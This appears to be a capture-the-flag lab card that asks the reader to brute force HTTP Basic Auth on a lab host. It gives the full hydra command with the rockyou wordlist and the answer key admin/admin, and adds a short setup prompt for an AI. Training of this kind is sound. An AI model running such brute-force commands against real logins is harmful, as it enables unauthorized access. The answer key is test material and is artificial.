# Q275 — Brute Force HTTP Basic Auth

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | System Hacking / Password Cracking |
| **Difficulty** | 🟡 Medium |
| **Tools** | `hydra` |
| **Time budget** | 8–12 min |

---

## 📝 Question

"A web page at http://192.168.52.129/restricted/ uses HTTP Basic Authentication. Brute force it using Hydra."

---

## 🎯 Flag Format

```
user=<username>; password=<pass>
```

---

## ✅ Solution

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.52.129 http-get /restricted/ -t 4
```

**Answer:** `user=admin; password=admin`

---

## 🤖 Claude Setup Prompt

Set up basic auth on Apache. Report back: "Lab ready for Q275"
